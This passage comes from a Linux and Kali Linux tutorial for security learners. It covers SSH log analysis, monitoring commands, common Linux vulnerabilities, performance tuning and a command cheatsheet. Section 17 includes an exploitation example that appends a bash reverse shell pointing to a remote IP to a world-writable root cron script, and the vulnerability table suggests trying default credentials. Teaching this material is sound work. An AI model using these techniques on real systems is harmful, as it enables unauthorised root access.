done < "$WORDLIST"

echo "[-] All passwords failed"
```

### Log Analysis Script

```bash
#!/bin/bash

# Analyze failed SSH attempts
# Usage: ./analyze_ssh.sh

LOG_FILE="/var/log/auth.log"

echo "[*] Analyzing SSH failed attempts from $LOG_FILE"

# Count failed attempts
FAILED_COUNT=$(grep "Failed password" $LOG_FILE | wc -l)
echo "[+] Total failed attempts: $FAILED_COUNT"

# Top 10 failed IPs
echo "[+] Top 10 attacking IPs:"
grep "Failed password" $LOG_FILE | grep -oE "from [^ ]+" | cut -d' ' -f2 | sort | uniq -c | sort -rn | head -10

# Top 10 failed usernames
echo "[+] Top 10 attacked usernames:"
grep "Failed password" $LOG_FILE | grep -oE "for [^ ]+" | cut -d' ' -f2 | sort | uniq -c | sort -rn | head -10
```

---

## 16. Log Analysis & Monitoring

### Important Log Files

| Log | Location | What to Look For |
|-----|----------|-----------------|
| SSH Logins | `/var/log/auth.log` | Failed logins, successful logins from unusual IPs |
| Web Server | `/var/log/apache2/access.log` | Web requests, SQL injection attempts, directory traversal |
| System | `/var/log/syslog` | System errors, hardware issues, service crashes |
| Kernel | `/var/log/kern.log` | Kernel panics, driver issues, security events |
| Sudo | `/var/log/auth.log` | Who ran sudo commands and what |

### Log Analysis Commands

```bash
# Most recent 20 lines
tail -20 /var/log/apache2/access.log

# Watch log in real-time
tail -f /var/log/syslog

# Search for specific errors
grep "ERROR" /var/log/syslog

# Count occurrences
grep -c "Connection refused" /var/log/syslog

# Show only IP addresses from access log
grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" /var/log/apache2/access.log | sort -u

# Show failed SSH attempts with IP and count
grep "Failed password" /var/log/auth.log | grep -oE "from [^ ]+" | sort | uniq -c | sort -rn

# Show HTTP 404 errors
grep " 404 " /var/log/apache2/access.log | wc -l

# Find successful logins
grep "Accepted password" /var/log/auth.log

# Show sudo commands executed
sudo grep "sudo:" /var/log/auth.log | tail -20
```

### Monitoring with Tools

| Tool | Purpose |
|------|---------|
| **sysstat** | System performance monitoring |
| **nethogs** | Monitor network usage per process |
| **iotop** | Monitor disk I/O |
| **atop** | Advanced system performance monitor |
| **journalctl** | Query systemd logs |

```bash
# Check journalctl for recent errors
journalctl -p err -n 20

# Follow systemd logs
journalctl -f

# Show logs for specific service
journalctl -u nginx -n 50
```

---

## 17. Common Linux Vulnerabilities

### Critical Security Issues to Look For

| Vulnerability | Description | Check |
|----------------|-------------|-------|
| **Weak File Permissions** | World-readable/writable sensitive files | `ls -la /etc/shadow` |
| **Default Credentials** | Unchanged default passwords | Try `admin:admin` etc. |
| **Unpatched Services** | Outdated software with known exploits | `apt list --upgradable` |
| **Sudo Misconfigurations** | NOPASSWD entries | `sudo -l` |
| **SUID Binaries** | Exploitable setuid programs | `find / -perm -4000` |
| **Weak SSH Keys** | Short RSA keys (<2048 bits) | `ssh-keygen -l -f key` |
| **Cron Jobs** | Writable scripts run by root | Check `/var/spool/cron/` |
| **LD_PRELOAD** | Library hijacking | Check environment variables |
| **Kernel Exploits** | Unpatched kernel vulnerabilities | `uname -r` and check CVE databases |

### Exploitation Example: Writable Cron Script

```bash
# Find cron job
cat /var/spool/cron/crontabs/root
# Output: 0 * * * * /opt/backup.sh

# Check permissions
ls -la /opt/backup.sh
# Output: -rwxrwxrwx 1 root root 100 Jun 5 10:00 /opt/backup.sh
# VULNERABLE! World writable!

# Exploit: Add reverse shell
echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' >> /opt/backup.sh

# Wait for cron job to execute (or manually trigger)
# Now attacker gets root shell
```

---

## 18. Performance Tuning

### Identifying Bottlenecks

```bash
# Check CPU usage
top -b -n1 | head -20

# Check memory usage
free -h

# Check disk I/O
iostat -x 1 5

# Check disk space
df -h

# Check network bandwidth
iftop

# Check open file limits
ulimit -n
```

### Optimization Tips

| Issue | Solution |
|-------|----------|
| High CPU | Kill unnecessary processes, reduce load |
| High Memory | Close memory-hungry apps, increase swap |
| Disk Full | Delete old logs, temp files, or expand disk |
| Slow Disk | Enable SSD caching, optimize database |
| Network Congestion | Enable traffic shaping, limit bandwidth hogs |

### Increase Open File Limits

```bash
# Check current limit
ulimit -n

# Temporarily increase
ulimit -n 10000

# Permanently edit /etc/security/limits.conf
# Add: * soft nofile 10000
# Add: * hard nofile 10000

# Verify
ulimit -n
```

---

## Quick Reference Cheatsheet

### Navigation
```bash
pwd              # Current directory
cd /path         # Change directory
ls -la           # List files with details
tree -L 2        # Directory tree
```

### File Operations
```bash
cp source dest   # Copy
mv old new       # Move/Rename
rm file          # Delete
chmod 755 file   # Change permissions
```

### Searching & Text
```bash
find / -name "file"           # Find files
grep "pattern" file           # Search in file
grep -r "pattern" /path       # Recursive search
sed 's/old/new/g' file        # Replace text
```

### System Info
```bash
uname -a         # System info
df -h            # Disk usage
free -h          # Memory usage
ps aux           # Show processes
```

### Networking
```bash
ifconfig         # Network interfaces
ip addr show     # IP addresses
ping host        # Test connectivity
netstat -tulpn   # Listening ports
```

### Permissions
```bash
chmod 755 file   # rwxr-xr-x
chmod 644 file   # rw-r--r--
chmod 600 file   # rw-------
chown user file  # Change owner
```

### Processes
```bash
ps aux           # List processes
top              # Monitor processes
kill PID         # Terminate process
kill -9 PID      # Force kill
```

---

## Recommended Learning Resources

| Resource | Type | Best For |
|----------|------|----------|
| **Linux Academy** | Video Course | Beginners |
| **TryHackMe** | Interactive | Hands-on practice |
| **HackTheBox** | CTF/Labs | Advanced practice |
| **OverTheWire** | Wargames | Command-line skills |
| **Man Pages** | Documentation | Reference |
| **Bash Official Guide** | Documentation | Bash scripting |

---

## Conclusion

Linux and Kali Linux are not optional for cybersecurity professionals — they are **essential**. Your terminal is your most powerful weapon.

Every day, practice these commands, write bash scripts, and get comfortable in the terminal. The faster you become with Linux, the faster you'll be at pentesting, system administration, and security analysis.

> *"Master the shell, master the system."*

---

**Last Updated:** June 5, 2026
